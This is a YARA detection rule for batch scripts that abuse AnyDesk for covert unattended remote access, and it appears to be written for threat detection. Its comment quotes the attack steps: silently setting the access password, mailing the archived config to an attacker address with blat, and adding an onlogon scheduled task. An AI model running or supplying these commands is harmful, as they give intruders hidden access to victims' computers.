/*
  AnyDesk silent unattended-access RMM abuse.

  A post-install batch (dropped to %temp%\ChromiumTemp…\) provisions a portable
  AnyDesk for covert remote access and exfiltrates its config:

      echo <password> | AnyDesk.exe --set-password _unattended_access
      ...rar a -hp<pw> AnyDesk.rar %ProgramData%\AnyDesk
      blat.exe -to <attacker> -server <smtp> ... -attach AnyDesk.rar
      schtasks /create /tn "Auto apdate" ... /sc onlogon /rl highest

  `AnyDesk.exe --set-password _unattended_access` is the discriminating mechanic:
  it sets the unattended-access password non-interactively so the operator can
  connect with no prompt on the victim. Threat actors (TA505 / social-engineering
  "fake support" crews) ship this as the autorun face of an AnyDesk-abuse kit.

  FP-safety: the literal `_unattended_access` flag combined with AnyDesk and
  `--set-password` in a sub-64 KB script has no benign analogue in the mail
  attachment vector (an MSP would push AnyDesk via its own installer/MSI, never as
  a .bat email attachment that pipes the password in). 3-way AND + size gate.

  Reference: MITRE ATT&CK T1219 (Remote Access Software), T1053.005 (Scheduled
             Task), T1048 (Exfiltration Over Alternative Protocol).
*/

rule AnyDesk_Unattended_Access_Abuse : rmm anydesk dropper heuristic malware
{
    meta:
        author      = "yarad"
        description = "Batch sets AnyDesk unattended-access password silently (RMM-abuse remote access kit)"
        reference   = "https://attack.mitre.org/techniques/T1219/"
        sample      = "12648cd9d425f78db2dbc6e03c14f11e6ac6aadf8b3975c23cce9519e2b58d33"
        score       = "75"
    strings:
        $ad = "AnyDesk" nocase
        $sp = "--set-password" nocase
        $ua = "_unattended_access" nocase
    condition:
        filesize < 65536 and all of them
}
